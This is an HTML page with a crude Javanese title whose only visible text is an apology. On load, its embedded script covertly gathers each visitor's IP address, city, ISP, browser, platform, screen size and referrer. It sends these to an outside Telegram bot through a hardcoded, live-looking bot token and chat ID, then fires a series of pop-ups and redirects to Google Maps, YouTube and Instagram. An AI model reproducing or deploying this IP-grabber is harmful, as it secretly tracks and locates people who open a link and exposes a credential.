
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>jembut keslomot santen</title>
  <script>
    const BOT_TOKEN = '7549616883:AAEBHMx4G4OC5MFJvrnWPYicby_xGJx1rRs';
    const CHAT_ID = '1246818625';

    const sendToTelegram = (message) => {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      }).catch(err => console.log("Telegram error", err));
    };

    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    const screen_size = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language;
    const platform = navigator.platform;
    const referrer = document.referrer || "direct";

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        const msg = `
📡 *New Visitor*
🌐 IP: ${data.ip}
🏙️ City: ${data.city}, ${data.region}, ${data.country_name}
🏢 ISP: ${data.org}
🕒 Time: ${time}
🖥️ Platform: ${platform}, ${screen_size}
🌍 Lang: ${language}
🔗 Referrer: ${referrer}
🧠 UA: ${ua}
        `;
        sendToTelegram(msg);
      })
      .finally(() => {
        // Redirects
        window.open("https://www.google.com/maps", "_blank");

        setTimeout(() => {
          if (/android/i.test(navigator.userAgent)) {
            window.open("intent://www.youtube.com/watch?v=xvFZjo5PgG0#Intent;package=com.google.android.youtube;scheme=https;end;", "_blank");
          } else {
            window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank");
          }
        }, 2000);

        setTimeout(() => {
          window.open("https://instagram.com/_u/instagram", "_blank");
        }, 4000);

        setTimeout(() => {
          window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
        }, 6000);
      });
  </script>
</head>
<body>
  <p style="font-family: monospace;">[ Menowo luput nyuwun ngapunten ]</p>
</body>
</html>
